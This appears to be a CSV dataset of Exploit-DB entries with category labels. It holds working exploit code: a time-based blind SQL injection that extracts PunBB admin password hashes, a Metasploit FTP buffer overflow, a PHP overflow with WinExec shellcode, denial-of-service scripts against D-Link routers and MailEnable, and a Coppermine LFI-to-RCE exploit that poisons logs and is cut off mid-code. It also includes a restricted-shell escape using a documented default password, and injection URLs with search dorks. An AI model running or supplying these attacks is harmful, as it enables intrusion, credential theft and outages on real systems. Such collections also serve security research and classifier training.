42937,"UCOPIA Wireless Appliance < 5.1.8 - Restricted Shell Escape # [CVE-2017-11321] UCOPIA Wireless Appliance < 5.1.8 Restricted Shell Escape  ## Asset Description  UCOPIA solutions bring together a combination of software, appliance and cloud services serving small to large customers.  More than 12,000 UCOPIA solutions are deployed and maintained by UCOPIA expert partners all over the world.  The affected asset in this report is a WiFi management appliance.   ## Vulnerability  Shell Escape via `less` command.  **Threat**  Improper sanitization of system commands in the restricted shell interface in UCOPIA Wireless Appliance, prior to 5.1.8, allows remote attackers to gain access to a system shell as the ""admin"" user.  **CVE ID**: CVE-2017-11321  **Access Vector**: network  **Security Risk**: critical  **Vulnerability**: CWE-78  **CVSS Base Score**: 9.1 (Critical)  **CVSS Vector**: CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:C/C:H/I:H/A:H  ### Proof of Concept: Restricted Shell Escape  By default, the UCOPIA wireless appliances exposes two shell access on port 22 (SSH) and 222 (ShellInTheBox).  A documented **admin** user exists on the system with the password **bhu85tgb**.  Quoted from the documentation :  > You can also retrieve the IP address of the outgoing interface. For this, you need to log in to the terminal of the virtual machine with the following username and password: admin/bhu85tgb, and then execute the interface command.  By logging in within these interfaces, we can access to a restricted shell (*clish*) that allows only a few commands.  However, the `less` command is allowed, and because `less` allows to execute shell commands when viewing a file, we can use it to escape the restricted shell.  Steps :  **1/** Login to the appliance using SSH or ShellInTheBox.  **2/** Run the `less /etc/passwd` command.  **3/** When viewing the file, type `!sh`  **4/** You now have unrestricted `admin` user access to the appliance.  ``` > less /etc/passwd !sh $ ls / bin dev etc home lib proc tmp user $ whoami admin ```  ## Solution  Update to UCOPIA 5.1.8  ## Timeline (dd/mm/yyyy)  * 08/03/2017 : Vulnerability discovery. * 03/05/2017 : Initial contact. * 10/05/2017 : GPG Key exchange. * 10/05/2017 : Advisory sent to vendor. * 17/05/2017 : Request for feedback. * 22/05/2017 : Vendor acknowledge the vulnerabilities. * 21/06/2017 : Sysdream Labs request for an ETA, warning for public disclosure. * 21/06/2017 : Vendor say that the UCOPIA 5.1.8 fixes the issue. * 29/09/2017 : Public disclosure.  ## Credits  * Nicolas CHATELAIN, Sysdream (n.chatelain -at- sysdream -dot- com)  --  SYSDREAM Labs <labs@sysdream.com>  GPG : 47D1 E124 C43E F992 2A2E 1551 8EB4 8CD9 D5B2 59A1  * Website: https://sysdream.com/  * Twitter: @sysdream",Restricted Shell Escape Asset Description,1
20207,"QSSL Voyager 2.0 1B - '.photon' Directory Information Disclosure source: https://www.securityfocus.com/bid/1648/info   The web server supplied with the QNX Voyager demo disk contains several vulnerabilities.   First, Voyager will follow relative paths passed to it in requests. This includes ../ style paths, which will allow Voyager to serve pages outside of the ""document root"". Another vulnerability is that the web server does not have sufficient security restrictions - this means that the web server can access any file, including protected files and special /dev entries.   As well, due to the integration of the web browser and web server, information used by the Photon GUI is easily exposed by requesting files under /.photon/. Additionally, html files generated by the web browser (error messages, for example) and the QNX configuration interface share the same directory as published html files.   While the Voyager web server is not intended to be used in a production environment, and is in fact intended only to be a demo of the QNX OS, users should be aware of these design errors.  [Revealing] URLS include... http://target/.photon/voyager/config.full The web client's settings file http://target/.photon/voyager/history.html Recently visited sites http://target/.photon/voyager/hotlist The list of book-marked sites http://target/.photon/pwm/pwm.menu The Photon Window Manager menu listing (Equivalent to MS Windows' 'start menu') http://target/.photon/phdial/connection [Modem build only]",Directory Information Disclosure,1
2059,"D-Link Devices - UPNP Stack Overflow Denial of Service (PoC) /* routers affected from eEye's advisory. /str0ke Routers Affected: DI-524 Rev A DI-524 Rev C DI-524 Rev D DI-604 Rev E DI-624 Rev C DI-624 Rev D DI-784 Rev A EBR-2310 Rev A WBR-1310 Rev A WBR-2310 Rev A */  /*  * D-Link Router UPNP DOS PoC  * Written By: ub3rst4r aka DiGiTALST*R  * Tested Against: DI-524 Rev. A  *  * A remote stack overflow exists in a range of wired and wireless D-Link   * routers. This vulnerability allows an attacker to execute privileged code  * on an affected device. Although a stack overflow does exist, debugging this   * vulnerabilty requires additional external hardware.  *   * NOTE: You might need to try sending this twice, or use 239.255.255.250  *  * Credits: eEye Digital Security  *  */  #include <stdio.h> #include <windows.h> #pragma comment(lib,""ws2_32"")  int main(int argc, char **argv) {     WSADATA wsa;      char buf[896];          int sockfd;     struct sockaddr_in serv_addr;      int ret;          if (argc < 2) {         printf(""Usage: dlinkdos <router ip>\n"");         return 0;     }          WSAStartup(MAKEWORD(1,1), &wsa);      // the main string     memcpy(buf, ""M-SEARCH "", 9);     memset(buf+9, 'A', 800);     memcpy(buf+809, "" HTTP/1.1\r\n"", 10);          // extra data     strcat(buf,         ""Host:239.255.255.250:1900\r\n""         ""ST:upnp:rootdevice\r\n""         ""Man:\""ssdp:discover\""\r\n""         ""MX:3\r\n""         ""\r\n""         ""\r\n"");      sockfd = socket(AF_INET, SOCK_DGRAM, 0);          serv_addr.sin_family = AF_INET;     serv_addr.sin_port = htons(1900);     serv_addr.sin_addr.s_addr = inet_addr(argv[1]);     memset(&serv_addr.sin_zero, '\0', 8);                           ret = sendto(sockfd,buf,sizeof(buf),0,(struct sockaddr *)&serv_addr, sizeof(struct sockaddr));     if (ret <= 0) {         printf(""failed to send request\n"");         return 0;     }           printf(""request sent!\n"");          WSACleanup();          return 0; }  // milw0rm.com [2006-07-22]",Stack Overflow Denial of Service,1
9849,"PunBB Extension Attachment 1.0.2 - SQL Injection #!/usr/bin/php <?php  print_r(' +-------------------------------------------------------------------------- -+ Punbb Extension Attachment <= v1.0.2 Bind SQL injection exploit by puret_t mail: puretot at gmail dot com team: http://www.wolvez.org dork: ""Powered by PunBB"" +-------------------------------------------------------------------------- -+ '); /** * works regardless of php.ini settings */ if ($argc < 3) { print_r(' +-------------------------------------------------------------------------- -+ Usage: php '.$argv[0].' host path host: target server (ip/hostname) path: path to punbb Example: php '.$argv[0].' localhost /punbb/ +-------------------------------------------------------------------------- -+ '); exit; }  error_reporting(7); ini_set('max_execution_time', 0);  $host = $argv[1]; $path = $argv[2];  $pre = 'pun_';  $benchmark = 200000000; $timeout = 10;  echo ""Plz Waiting...\nPassword:\n""; /** * get pass */ $j = 1; $pass = '';  $hash[0] = 0; //null $hash = array_merge($hash, range(48, 57)); //numbers $hash = array_merge($hash, range(97, 122)); //a-z letters  while (strlen($pass) < 40) { for ($i = 0; $i <= 255; $i ++) { if (in_array($i, $hash)) { $cmd = '1f1%27%20AND%20(IF((ASCII(SUBSTRING((SELECT%20password%20FROM%20'.$pre.'us ers%20WHERE%20group_id=1%20LIMIT%201),'.$j.',1))='.$i.'),BENCHMARK('.$bench mark.',CHAR(0)),1))%23'; send(); usleep(2000000); $starttime = time(); send(); $endtime = time(); $difftime = $endtime - $starttime; if ($difftime > $timeout) { $pass .= chr($i); echo chr($i); break; } } if ($i == 255) exit(""\nExploit Failed!\n""); } $j ++; }  echo ""\nSalt:\n""; /** * get salt */ $j = 1; $salt = '';  $hash[0] = 0; //null $hash = array_merge($hash, range(33, 126));  while (strlen($salt) < 12) { for ($i = 0; $i <= 255; $i ++) { if (in_array($i, $hash)) { $cmd = '1f1%27%20AND%20(IF((ASCII(SUBSTRING((SELECT%20salt%20FROM%20'.$pre.'users% 20WHERE%20group_id=1%20LIMIT%201),'.$j.',1))='.$i.'),BENCHMARK('.$benchmark .',CHAR(0)),1))%23'; send(); usleep(2000000); $starttime = time(); send(); $endtime = time(); $difftime = $endtime - $starttime; if ($difftime > $timeout) { $salt .= chr($i); echo chr($i); break; } } if ($i == 255) exit(""\nExploit Failed!\n""); } $j ++; }  exit(""\nExpoilt Success!\nPassword Hash:\t$pass\nSalt:\t$salt\n"");  function send() { global $host, $path, $cmd;  $data = ""GET "".$path.""misc.php?item=1&secure_str="".$cmd."" HTTP/1.1\r\n""; $data .= ""Host: $host\r\n""; $data .= ""Connection: Close\r\n\r\n"";  $fp = fsockopen($host, 80); fputs($fp, $data);  $resp = '';  while ($fp && !feof($fp)) $resp .= fread($fp, 1024);  return $resp; }  ?>",SQL Injection,1
887,"MailEnable 1.8 - Remote Format String Denial of Service                                                                                                                                                                                                                                                                ################################################################## #                                                                # #               See-security Technologies ltd.                   # #                                                                # #                http://www.see-security.com                     # #                                                                # ################################################################## #                                                                # #          MailEnable 1.8 Format String DoS exploit              # #                                                                # #                Discovered by Mati Aharoni                      # #                                                                # #                   Coded by tal zeltzer                         # #                                                                # ##################################################################   import sys import time import socket   def PrintLogo(): 	print ""##################################################################"" 	print ""#                                                                #"" 	print ""#               See-security Technologies ltd.                   #"" 	print ""#                                                                #"" 	print ""#                http://www.see-security.com                     #"" 	print ""#                                                                #"" 	print ""##################################################################"" 	print ""#""+"" ""*64+""#"" 	print ""#          MailEnable 1.8 Format String DoS exploit              #"" 	print ""#""+"" ""*64+""#"" 	print ""#                Discovered by Mati Aharoni                      #"" 	print ""#                                                                #"" 	print ""#                   Coded by tal zeltzer                         #"" 	print ""#""+"" ""*64+""#"" 	print ""#""*66+""\n""   PrintLogo() if (len(sys.argv) != 2): 	print ""\n\n"" 	print sys.argv[0] + "" [Target Host]"" 	sys.exit() sSmtpSocket = socket.socket(socket.AF_INET,socket.SOCK_STREAM) print ""[-] Connecting to "" + sys.argv[1] sSmtpSocket.connect((sys.argv[1],25)) print ""[-] Connected to "" + sys.argv[1] print ""[-] Sending malformed packet"" sSmtpSocket.send(""mailto: %s%s%s\r\n"") sSmtpSocket.close() print ""[-] Malformed packet sent""   # milw0rm.com [2005-03-17]",Remote Format String Denial of Service,1
43001,"Microsoft Windows - 'nt!NtQueryObject (ObjectNameInformation)' Kernel Pool Memory Disclosure /* Source: https://bugs.chromium.org/p/project-zero/issues/detail?id=1303&desc=2  We have discovered that the nt!NtQueryObject syscall handler discloses portions of uninitialized pool memory to user-mode clients when the following conditions are met:   a) It is invoked with the ObjectNameInformation information class and a file object associated with a file on local disk (other configurations were not tested).  b) The provided buffer is too short to contain even the first part of the output data, i.e. the name of the harddisk volume device (e.g. ""\Device\HarddiskVolume2"").  By empirically testing the system call in the above set up, we have found that it actually behaves in five different ways depending on the length of the output buffer:   a) From 1 to 7 (32-bit) or 15 (64-bit): no output, syscall returns STATUS_INFO_LENGTH_MISMATCH.  b) From 8/16 to N-1 (N being size required to store the name of the volume device): uninitialized pool memory is disclosed to user-mode, syscall returns STATUS_BUFFER_OVERFLOW.  c) From N to N+1: partial path is copied to user-mode, syscall returns STATUS_OBJECT_PATH_INVALID.  d) From N+2 to M-1 (M being the size required to store the entire output data): partial path is copied to user-mode, syscall returns STATUS_BUFFER_OVERFLOW.  e) From M to ...: full path is copied to user-mode, syscall returns STATUS_SUCCESS.  The issue is of course with case (b); it means that between 1 and about 56 bytes of uninitialized kernel pool memory can be leaked with a single nt!NtQueryObject call.  The attached proof of concept program has been tested on 32 and 64-bit builds of Windows 7. It dumps the data leaked by the affected syscall in each subsequent iteration, and then waits for user interaction (ENTER key press) before executing the next one. When the Special Pools mechanism is enabled for ntoskrnl.exe, the PoC output should be similar to the following:  --- cut --- 00000000: e1 e1 e1 e1 e1 e1 e1 e1 e1 e1 e1 e1 e1 e1 e1 e1 ................ 00000010: e1 e1 e1 e1 e1 e1 e1 e1 e1 e1 e1 e1 e1 e1 e1 e1 ................ 00000020: e1 e1 e1 e1 e1 e1 e1 e1 e1 e1 e1 e1 e1 e1 e1 e1 ................ 00000030: e1 e1 e1 e1 e1 e1 e1 ?? ?? ?? ?? ?? ?? ?? ?? ?? ................  00000000: 23 23 23 23 23 23 23 23 23 23 23 23 23 23 23 23 ################ 00000010: 23 23 23 23 23 23 23 23 23 23 23 23 23 23 23 23 ################ 00000020: 23 23 23 23 23 23 23 23 23 23 23 23 23 23 23 23 ################ 00000030: 23 23 23 23 23 23 23 ?? ?? ?? ?? ?? ?? ?? ?? ?? #######.........  00000000: 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d ---------------- 00000010: 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d ---------------- 00000020: 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d 2d ---------------- 00000030: 2d 2d 2d 2d 2d 2d 2d ?? ?? ?? ?? ?? ?? ?? ?? ?? -------.........  00000000: 37 37 37 37 37 37 37 37 37 37 37 37 37 37 37 37 7777777777777777 00000010: 37 37 37 37 37 37 37 37 37 37 37 37 37 37 37 37 7777777777777777 00000020: 37 37 37 37 37 37 37 37 37 37 37 37 37 37 37 37 7777777777777777 00000030: 37 37 37 37 37 37 37 ?? ?? ?? ?? ?? ?? ?? ?? ?? 7777777......... --- cut ---  A different repeated marker byte (inserted by Special Pools upon allocation) is displayed each time, which means that uninitialized data from new pool allocations is disclosed to the user-mode client in each attempt.  Repeatedly triggering the vulnerability could allow local authenticated attackers to defeat certain exploit mitigations (kernel ASLR) or read other secrets stored in the kernel address space. */  #include <Windows.h> #include <winternl.h> #include <ntstatus.h> #include <cstdio>  #define ObjectNameInformation ((OBJECT_INFORMATION_CLASS)1)  VOID PrintHex(PBYTE Data, ULONG dwBytes) {   for (ULONG i = 0; i < dwBytes; i += 16) {     printf(""%.8x: "", i);      for (ULONG j = 0; j < 16; j++) {       if (i + j < dwBytes) {         printf(""%.2x "", Data[i + j]);       }       else {         printf(""?? "");       }     }      for (ULONG j = 0; j < 16; j++) {       if (i + j < dwBytes && Data[i + j] >= 0x20 && Data[i + j] <= 0x7e) {         printf(""%c"", Data[i + j]);       }       else {         printf(""."");       }     }      printf(""\n"");   } }  int main() {   BOOL wow64 = FALSE;   if (!IsWow64Process(GetCurrentProcess(), &wow64) || wow64) {     printf(""The program has to be built for the native architecture of your OS (x86 or x64).\n"");     return 1;   }    HANDLE hFile = CreateFile(L""C:\\Windows\\system32\\svchost.exe"", FILE_READ_ATTRIBUTES, 0, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);   if (hFile == INVALID_HANDLE_VALUE) {     printf(""CreateFile failed, %d\n"", GetLastError());     return 1;   }    BYTE OutputBuffer[0x100];   ULONG ReturnLength;   ULONG MaximumLeakLength;    for (MaximumLeakLength = 0; MaximumLeakLength < sizeof(OutputBuffer); MaximumLeakLength++) {     NTSTATUS st = NtQueryObject(hFile, ObjectNameInformation, OutputBuffer, MaximumLeakLength, &ReturnLength);     if (st == STATUS_OBJECT_PATH_INVALID) {       MaximumLeakLength--;       break;     }   }    while (1) {     RtlZeroMemory(OutputBuffer, sizeof(OutputBuffer));      NTSTATUS st = NtQueryObject(hFile, ObjectNameInformation, OutputBuffer, MaximumLeakLength, &ReturnLength);     if (st != STATUS_BUFFER_OVERFLOW) {       printf(""NtQueryObject failed, %x\n"", st);       CloseHandle(hFile);       return 1;     }      PrintHex(OutputBuffer, MaximumLeakLength);      getchar();   }    CloseHandle(hFile);   return 0; }",Kernel Pool Memory Disclosure,1
39729,"PCMan FTP Server 2.0.7 - 'RENAME' Remote Buffer Overflow (Metasploit) ## # This module requires Metasploit: http://metasploit.com/download # Current source: https://github.com/rapid7/metasploit-framework ##  ## Original Exploit Information ## # Date:  29 Aug 2015 # Exploit Author: Koby # Tested on: Windows XP SP3 # Link: https://www.exploit-db.com/exploits/38013/  ## Software Information ## # Vendor Homepage: http://pcman.openfoundry.org/ # Software Link: https://www.exploit-db.com/apps/9fceb6fefd0f3ca1a8c36e97b6cc925d-PCMan.7z # Version: 2.0.7  ## Metasploit Module Information ## # Date:  16 April 2016 # Exploit Author: Jonathan Smith # Tested on: Windows XP SP2  require 'msf/core'  class Metasploit3 < Msf::Exploit::Remote   include Msf::Exploit::Remote::Ftp   def initialize(info = {})   super(update_info(info,      'Name' => 'PCMan RENAME overflow',      'Description' => 'This module exploits a buffer overflow in the RENAME command of PCMAN FTP Server 2.0.7. This requires authentication but anonymous credentials are enabled by default.',      'Author' => [ 'Metasploit module author: Jonathan Smith. Vulnerability originally discovered by Koby on 29 August 2015. Metasploit module developed 16 April 2016.'],      'Version' => '$Revision: 1 $',      'Platform' => ['win'],      'Targets' => [ [ 'Windows XP SP2', { } ],],      'DefaultTarget' => 0,      'License' => GPL_LICENSE,      'Payload' => {'BadChars' => ""\x00\x0a\x0d""},      'DefaultOptions' => {'EXITFUNC' => 'process'}   ))   end  def exploit   connect_login   exploitcode = ""A"" * 2004 + ""\x65\x82\xA5\x7C"" + make_nops(30) + payload.encoded   send_cmd( ['RENAME', exploitcode] , false )   disconnect   end  end",Remote Buffer Overflow,1
10550,Joomla! Component City Portal - Blind SQL Injection <------------------- header data start ------------------- > ######################################################################### #        Joomla Component City Portal Blind SQL Injection Vulnerability #                                      ######################################################################### # author        : Fl0riX   # Script Name    : Joomla Component City Portal  # Bug Type       : Blind SQL Injection  # Infection      : Admin login bilgileri al&#65533;nabilir.  # Demo Vuln.     :  (-) &#65533; http://server/index.php?option=com_content&task=view&id=36&Itemid=1 and 1=0 (+) &#65533; http://server/index.php?option=com_content&task=view&id=36&Itemid=1 and 1=1  # Bug Fix Advice : Zararl&#65533; karakterler filtrelenmelidir.  #############################################################  < ------------------- header data end of ------------------- >  < -- bug code start -- >  path/index.php?option=com_content&task=view&id=36&Itemid=[Blind SQL]  < -- bug code end of -- >,Blind SQL Injection,1
3037,"Durian Web Application Server 3.02 - Remote Buffer Overflow <?php /* Durian Web Application Server 3.02 freeware for Win32 buffer overflow execute command exploit  by rgod mail: retrog at alice dot it site: http://retrogod.altervista.org  tested against xp sp2 ita  software site -> http://sourceforge.net/projects/durian/  */  error_reporting(E_ALL); $address = ""192.168.1.3""; $service_port = ""4002"";  $shellcode = ""\xeb\x1b"". ""\x5b"". ""\x31\xc0"". ""\x50"". ""\x31\xc0"". ""\x88\x43\x59"". ""\x53"". ""\xbb\x6d\x13\x86\x7c"". //WinExec, 0x7c86136d ""\xff\xd3"". ""\x31\xc0"". ""\x50"". ""\xbb\xda\xcd\x81\x7c"". //ExitProcess, 0x7c81cdda ""\xff\xd3"". ""\xe8\xe0\xff\xff\xff"". ""\x63\x6d\x64"". ""\x2e"". ""\x65"". ""\x78\x65"". ""\x20\x2f"". ""\x63\x20"". ""cmd.exe /c start notepad & "";  //$eip=""\x72\xe0\xf1\x00"";//DEP disabled $eip=""\x72\xe0\xf2\x00"";  $ch  =array(""\xaa"",""\xa0"",""\x41""); $size=array(30,70,150,330,520,700,1400,2300);      for ($j=0; $j<count($ch); $j++){         for ($i=0; $i<count($size); $i++){             $junk="""";             if (($j==2) and ($i==7)){                 $junk =""AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSSTTTTUUUUVVVVXXXX"";                 $junk.=""YYYYZZZZaaaabbbbccccddddeeeeffffgggghhhhiiiijjjjkkkkllllmmmmnnnnooooppppqqqqrrrrssssttttuuuu""; 		$junk.=$eip; //jmp shellcode 		for ($n=1; $n<=100; $n++){ 		    $junk.=""\x90""; 		} 		$junk.=$shellcode;                 for ($n=1; $n=(2300-strlen($junk)); $n++){ 		    $junk.=""\x90""; 		}             }             else { 		for ($k=1; $k<=$size[$i]; $k++){                     $junk.=$ch[$j];                 } 	    }             $socket = socket_create(AF_INET, SOCK_STREAM, SOL_TCP);             if ($socket < 0) {                 die(""socket_create() failed:\n reason: "" . socket_strerror($socket) . ""\n"");             }             $result = socket_connect($socket, $address, $service_port);             if ($result < 0) {                 die(""socket_connect() failed:\n reason: ($result) "" . socket_strerror($result) . ""\n"");             }             $in = $junk;             socket_write($socket, $in, strlen ($in));             socket_close($socket);         }    } ?>  # milw0rm.com [2006-12-29]",Remote Buffer Overflow,1
6788,"Yappa-ng 2.3.3-beta0 - 'album' Local File Inclusion [o]------------------------------------------------------------------------------------[x]  |  Local File Include Vulnerability                                                    | [o]------------------------------------------------------------------------------------[o]  |  Software : yappa-ng Version 2.3.2                                                   |  |  Vendor   : http://www.zirkon.at/zirkon/scripts/yappa-ng/yappa-ng_main_eng.html      |  |  Date     : 19 October 2008                                                          |  |  Author   : Vrs-hCk                                                                  |  |  Contact  : d00r[at]telkom[dot]net                                                   | [o]------------------------------------------------------------------------------------[o]  [Â»] Google Dork      ""Powered by yappa-ng 2.3.2""  [Â»] Exploit      http://[site]/[yappa-ng-path]/index.php?album=[LFI]%00  [Â»] Proof of Concept      http://www.zirkon.at/yappa-ng_demo/index.php?album=[LFI]%00  [o]------------------------------------------------------------------------------------[x]  |  Greetz                                                                              | [o]------------------------------------------------------------------------------------[o]  |  All Member oF MainHack BrotherHood - www.MainHack.com - www.ServerIsDown.org        |  |  Paman, OoN_Boy, NoGe, Fluzy, H312Y, s3t4n, NgL, ScanneD, }^-^{, eminem,             |  |  loqsa, pizzyroot, xx_user, ^Bradley, ayulina, MaDOnk, nTc, dkk ...                  |  |  c0li.m0de.0n & BeHave oR BeGone !!!                                                 | [o]------------------------------------------------------------------------------------[o]  # milw0rm.com [2008-10-19]",Local File Inclusion,1
17125,"Dream Vision Technologies Web Portal - SQL Injection ##################################################################################### # Title : Dream Vision Technologies SQL Injection Vulnerability # # Author: eXeSoul # # Home  : 1337day.com or www.indishell.in /www.andhrahackers.com # # Email : exe.soul@live.com # # date  : 6/04/2011 # # d0rk:-  Developed and Managed by Dream Vision Technologies Pvt Ltd #		        # category  : Web Apps [SQli] #        #################################################################################### #################################################################################### # # # #    Go To Site :- # #    #   #    *SQL injection Vulnerability* # # # #      [+][php] # #      [*]http://site.com/product.php?sid=17' #      [*]http://site.com/product.php?sid=[SQLI]	 # #      [*]http://site.com/detail.php?id=7' #      [*]http://site.com/detail.php?id=[SQLI] # #      find any file like .php?id or sid whatever , mostly all are vul..... to sqli.! # #     => PROUD TO BE AN INDIAN | Anythning for INDIA | JAI-HIND | Maa Tujhe Salam # #     => c0d3 for motherland, h4ck for motherland # # #    #    [#] DOne now time to rock \m/ # #    # #################################################################### -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= <3 Love: -[SiLeNtp0is0n]-, stRaNgEr(lucky), inX_rOot, NEO H4cK3R, DarkL00k, Th3 RDX, G00g!3 W@rr!0r, Nazz ,r45c4l, str1k3r, co0Lt04d , ATUL DWIVEDI , Jackh4xor , Bon3 , Badboy-Albinia, Mr.SK , I-H Guru,X__HMG, AK-47, [ICW] [Andhra Hackers], Ethical N00b,Maxy,Brueni, [Indishell crew], r0073r.! -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= ############################################ # #  I'm eXeSoul  member from Inj3ct0r Team # ############################################ #################################################################### # #  Bug discovered : 3 April 2011 #################################################################### # # Jay Mahadev.!!  Jay shree Ram.!! jay Shree krishna.!! Jay hind.!! # #################################################################### # # # 1337day.com [2011-04-06] ####################################################################",SQL Injection,1
30507,"gMotor2 Game Engine - Multiple Vulnerabilities source: https://www.securityfocus.com/bid/25358/info  The gMotor2 game engine is prone to multiple code-execution and denial-of-service vulnerabilities. Four vulnerabilities were reported.  These vulnerabilities may be triggered by malicious client requests to games that use the affected engine, including rFactor. Successful exploits could crash a game server or let remote attackers execute arbitrary code on the computer hosting affected software.  NOTE: This BID originally stated that the vulnerabilities were in the rFactor game. New information shows that the gMotor2 game engine and multiple games that use the engine are vulnerable. This BID was updated to reflect this new information.   https://github.com/offensive-security/exploitdb-bin-sploits/raw/master/bin-sploits/30507.zip",denial-of-service vulnerabilities,1
29601,"Fullaspsite ASP Hosting Site - 'listmain.asp?cat' SQL Injection source: https://www.securityfocus.com/bid/22545/info  Fullaspsite Shop is prone to multiple input-validation issues, including multiple cross-site scripting issues and an SQL-injection issue, because the application fails to properly sanitize user-supplied input.  A successful exploit of these vulnerabilities could allow an attacker to compromise the application, access or modify data, steal cookie-based authentication credentials, or even exploit vulnerabilities in the underlying database implementation. Other attacks are also possible.  http://www.example.com/ScriptPath/listmain.asp?cat=[ SqL Code ]",SQL Injection,1
6178,"Coppermine Photo Gallery 1.4.18 - Local File Inclusion / Remote Code Execution <?php  /* 	---------------------------------------------------------------------- 	Coppermine Photo Gallery <= 1.4.18 LFI / Remote Code Execution Exploit 	---------------------------------------------------------------------- 	 	author...: EgiX 	mail.....: n0b0d13s[at]gmail[dot]com 	 	link.....: http://coppermine-gallery.net/ 	dork.....: ""Powered by Coppermine Photo Gallery""  	[-] vulnerable code to LFI in /include/init.inc.php 	 	263.	// Start output buffering 	264.	ob_start('cpg_filter_page_html'); 	265.	 	266.	// Parse cookie stored user profile 	267.	user_get_profile(); <==== [1] 	268.	 	269.	// Authenticate 	270.	$cpg_udb->authenticate(); 	 	[...] 	 	301.	// Process language selection if present in URI or in user profile or try 	302.	// autodetection if default charset is utf-8 	303.	if (!empty($_GET['lang'])) 	304.	{ 	305.	        $USER['lang'] = ereg(""^[a-z0-9_-]*$"", $_GET['lang']) ? $_GET['lang'] : $CONFIG['lang']; 	306.	} 	307.	 	308.	if (isset($USER['lang']) && !strstr($USER['lang'], '/') && file_exists('lang/' . $USER['lang'] . '.php')) 	309.	{ 	310.	        $CONFIG['default_lang'] = $CONFIG['lang'];          // Save default language 	311.	        $CONFIG['lang'] = strtr($USER['lang'], '$/\\:*?""\'<>|`', '____________'); 	312.	} 	313.	elseif ($CONFIG['charset'] == 'utf-8') <====== [2] 	314.	{ 	315.	        include('include/select_lang.inc.php'); 	316.	        if (file_exists('lang/' . $USER['lang'] . '.php')) 	317.	        { 	318.	                $CONFIG['default_lang'] = $CONFIG['lang'];      // Save default language 	319.	                $CONFIG['lang'] = $USER['lang']; 	320.	        } 	321.	} 	322.	else 	323.	{ 	324.	        unset($USER['lang']); 	325.	} 	326.	 	327.	if (isset($CONFIG['default_lang']) && ($CONFIG['default_lang']==$CONFIG['lang'])) 	328.	{ 	329.	                unset($CONFIG['default_lang']); 	330.	} 	331.	 	332.	if (!file_exists(""lang/{$CONFIG['lang']}.php"")) 	333.	  $CONFIG['lang'] = 'english'; 	334.	 	335.	// We load the chosen language file 	336.	require ""lang/{$CONFIG['lang']}.php""; <======== [3]  	if $CONFIG['charset'] is set to 'utf-8' [2] (this is the default configuration), an attacker could be able to 	include an arbitrary local file through the require() at line 336 [3], due to $USER array can be manipulate by 	cookies (see user_get_profile() function [1] defined into /include/functions.inc.php, near lines 128-146) 	 	[-] Path disclosure in /themes/sample/theme.php 	 	[-] Possible bug fix in /include/functions.inc.php 	 	128.	function user_get_profile() 	129.	{ 	130.	        global $CONFIG, $USER; 	131.			 	132.		if (isset($_COOKIE[$CONFIG['cookie_name'].'_data'])) { 	133.			$USER = @unserialize(@base64_decode($_COOKIE[$CONFIG['cookie_name'].'_data'])); 	134.			$USER['lang'] = ereg(""^[a-z0-9_-]*$"", $USER['lang']) ? $USER['lang'] : $CONFIG['lang']; 	135.	       	} 	 */  error_reporting(0); set_time_limit(0); ini_set(""default_socket_timeout"", 5);  define(STDIN, fopen(""php://stdin"", ""r""));  function http_send($host, $packet) { 	$sock = fsockopen($host, 80); 	while (!$sock) 	{ 		print ""\n[-] No response from {$host}:80 Trying again...""; 		$sock = fsockopen($host, 80); 	} 	fputs($sock, $packet); 	while (!feof($sock)) $resp .= fread($sock, 1024); 	fclose($sock); 	return $resp; }  function get_info() { 	global $host, $path, $cookie, $version, $path_disc; 	 	$packet  = ""GET {$path} HTTP/1.0\r\n""; 	$packet .= ""Host: {$host}\r\n""; 	$packet .= ""Connection: close\r\n\r\n""; 	$html	 = http_send($host, $packet); 	 	preg_match(""/Set-Cookie: (.*)_data/"", $html, $match); 	$cookie = $match[1]; 	 	preg_match(""/<!--Coppermine Photo Gallery (.*) /"", $html, $match); 	$version = $match[1]; 	 	$packet  = ""GET {$path}themes/sample/theme.php HTTP/1.0\r\n""; 	$packet .= ""Host: {$host}\r\n""; 	$packet .= ""Connection: close\r\n\r\n""; 	 	preg_match(""/in <b>(.*)themes/"", http_send($host, $packet), $match); 	$path_disc = $match[1]; }  function get_logs() { 	$logs[] = ""/apache/logs/access.log""; 	$logs[] = ""/apache2/logs/access.log""; 	$logs[] = ""/apache/log/access.log""; 	$logs[] = ""/apache2/log/access.log""; 	$logs[] = ""/logs/access.log""; 	$logs[] = ""/var/log/apache/access.log""; 	$logs[] = ""/var/log/apache2/access.log""; 	$logs[] = ""/var/log/access.log""; 	$logs[] = ""/var/www/logs/access.log""; 	$logs[] = ""/var/www/log/access.log""; 	$logs[] = ""/var/log/httpd/access.log""; 	$logs[] = ""/etc/httpd/logs/access.log""; 	$logs[] = ""/usr/local/apache/logs/access.log""; 	$logs[] = ""/usr/local/apache2/logs/access.log""; 	 	for ($i = 0, $climb = ""../..""; $i < 7; $i++) 	{ 		foreach ($logs as $_log) $array[] = $climb.$_log; 		$climb .= ""/..""; 	} 	 	return $array; }  function first_time() { 	global $host, $path; 	 	$packet  = ""GET {$path}proof.php HTTP/1.0\r\n""; 	$packet .= ""Host: {$host}\r\n""; 	$packet .= ""Connection: close\r\n\r\n"";  	return (!preg_match(""/_code_/"", http_send($host, $packet))); }  function lfi() { 	global $host, $path, $cookie; 	 	$logs = get_logs();  	foreach ($logs as $_log) 	{ 		print ""[-] Trying to include {$_log}\n""; 		 		$data = base64_encode(serialize(array(""ID"" => md5(time()), ""am"" => 1, ""lang"" => $_log.chr(0)))); 		 		$packet	 = ""GET {$path} HTTP/1.0\r\n""; 		$packet .= ""Host: {$host}\r\n""; 		$packet .= ""Cookie: {$cookie}_data={$data}\r\n""; 		$packet .= ""Connection: close\r\n\r\n""; 		$resp	 = http_send($host, $packet); 		 		if (!preg_match(""/f=fopen/"", $resp) && 